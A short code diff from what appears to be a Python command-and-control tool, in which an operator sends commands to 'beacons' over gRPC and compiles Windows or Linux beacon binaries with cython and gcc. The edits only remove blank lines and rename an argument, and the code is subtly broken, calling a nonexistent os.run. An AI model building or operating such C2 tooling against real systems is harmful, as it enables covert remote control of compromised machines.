@@ -27,7 +27,6 @@ class UnaryClient(object):
         message = pb2.Message(bID=beaconID, message=message)
         print(f'{message}')
         return self.stub.GetServerResponse(beaconID, message)
-
 def BobTheBuilder():
     buildmeabeacon = input("Are we building Win or Nix? >")
 
@@ -45,7 +44,6 @@ def FarmerPickles(PyFileName):
         os.run(f"cython {PyFileName}.py --embed")
         PYTHONLIBVER = sys.version_info[:2]
         os.run(f"gcc -Os $(python3-config --includes) {PyFileName}.c -o output_bin_file $(python3-config --ldflags) -l {PYTHONLIBVER}")
-
 def SendCommand(beaconID):
     '''
     This uses gRPC to talk with the C2
@@ -57,7 +55,7 @@ def SendCommand(beaconID):
     '''
     command = input("> ")
     client = UnaryClient()
-    result = client.get_url(message=command, bID=beaconID)
+    result = client.get_url(message=command, beaconID=beaconID)
     print(f'{result}')
 
 if __name__ == '__main__':
